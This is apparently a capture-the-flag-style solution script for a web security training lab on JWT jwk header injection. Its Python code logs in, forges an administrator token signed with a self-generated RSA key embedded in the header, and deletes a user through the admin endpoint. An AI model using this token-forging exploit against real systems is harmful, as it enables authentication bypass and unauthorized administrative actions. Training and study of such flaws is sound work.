'''
This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
'''

'''
Notes: 
- this lab can be solved manually via Burp JWT Editor
- server is vulnerable to self-signed JWT (no signature validation on whitelisted private keys)
- server is misconfigured to accept jwk parameter in header

1. generate RSA key pair
2. embed public key to JWT header's jwk parameter
3. modify JWT payload
4. update JWT signature by signing with RSA private key
5. send JWT token
'''

import jwt
import requests
from bs4 import BeautifulSoup
from jwcrypto import jwk


proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0aca0001035c1d0d8021533c00d00095.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# get JWT session cookie
session_cookie = s.cookies.get('session')
jwt_payload = jwt.decode(session_cookie, options={'verify_signature':False})

jwt_payload['sub'] = 'administrator'

# generate RSA key and embed public key in to JWT's jwk header
key = jwk.JWK.generate(kty='RSA', size=2048)
public_key = key.export_public(as_dict=True)
private_key = key.export_to_pem(private_key=True, password=None)

# generate encoded token with updated signature
session_cookie = jwt.encode(jwt_payload, private_key, algorithm='RS256', headers={'jwk':public_key})
s.cookies.set('session', session_cookie)

# delete carlos
payload = {'username':'carlos'}
s.get(f"{url}/admin/delete", params=payload)

'''
Example of updated JWT
header:
{
    "alg": "RS256",
    "jwk": {
        "e": "AQAB",
        "kty": "RSA",
        "n": "xaFFG6UOYpYWyhFgOIyKtARKoMRiGiFTg3FAOHaUfoSsp4p2x868ccCwSwYx4e6OTbcqiwzTCPV9bvCkPzMt4fgYF29T1_LWTbwcV2pU_RKNUhQagNGQaU5z3G9xdVPYCeaZZL6tjgbyz8PBtt_7CbNSTd0ovz6HQdLRWnHKEFzgIXFO8ypWYff71_j-cPfRhk892_GUijjRKDn76RhJI2vZDeqG1gq4Se9hZTsCUP6mdJ5m1sd04a0EkwL8Mau1McOh0hxiQq-YdDfJ9Uv06lPG5402s4BMa5oCMpcYGh4TN6Wy5bX-ucL78bAHsxdOtRmAzsHJL13sZ2ZVgAiyvw"
    },
    "typ": "JWT"
}
payload:
{
    "iss": "portswigger",
    "exp": 1723090369,
    "sub": "administrator"
}
'''
